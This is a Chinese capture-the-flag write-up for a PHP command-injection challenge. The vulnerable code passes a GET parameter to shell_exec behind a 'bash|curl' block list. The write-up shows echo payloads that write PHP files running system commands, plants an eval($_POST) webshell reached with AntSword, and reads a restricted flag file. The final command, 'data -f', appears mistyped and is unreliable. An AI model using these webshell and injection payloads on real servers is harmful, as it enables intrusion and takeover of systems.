# Week5 So Baby RCE Again 200

## 0、知识点与技术

>   REC 远程命令执行

>   `shell_exec`： 通过 shell 执行命令并将完整的输出以字符串的方式返回

```bash
echo "<?php @eval(\$_POST['shell']);?>" > 3.php
echo "<?php eval(system('ls /'));?>" > 1.php
echo "<?php eval(system('cat /ffll444aaggg '));?>" > 1.php
```



## 1、分析

>   打开页面有如下代码

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/bash|curl/i',$_GET["cmd"])){
        echo "Hacker!";
    }else{
        shell_exec($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

>   看代码可以知道是要通过`shell_exec()`去执行命令，但是进行测试会发现没有回显

>   其中除了不能有bash和curl并没有太多的限制，可以考虑使用`echo`写入文件

```php
?cmd=echo "<?php eval(system('ls'));?>" > 1.php
```

>   执行完成后，没有回显，然后访问`1.php`，可以看到文件写入成功

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221215224401.png)

## 2、解题

>   接下来就是要eval函数写个后门使用蚁剑连接一下

```php
echo "<?php @eval(\$_POST['shell']);?>" > 2.php
```

>   其中要注意的就是`$`要加个反斜杠，要不然访问文件会报错，使用蚁剑就会连接不上，正确情况是不会报错，页面是空白的

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221215224807.png)

>   连接成功后跑到根目录发现并不能直接读取flag，空白的，那么两种情况
>
>   一是：这是个假flag
>
>   二是：没有权限读取

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221215225040.png)

>   先验证一下是否真的没权限，右键打开终端，输入命令`ls -al`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221215225321.png)

>   发现flag的文件权限为`-rwx------`，只有拥有者有权限，其他人不能读取

>   最后谷歌一波发现有一种方法可以越权读取文件，命令如下

```c
data -f ffll444aaggg
```

>   然后成功获取flag

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221215225839.png)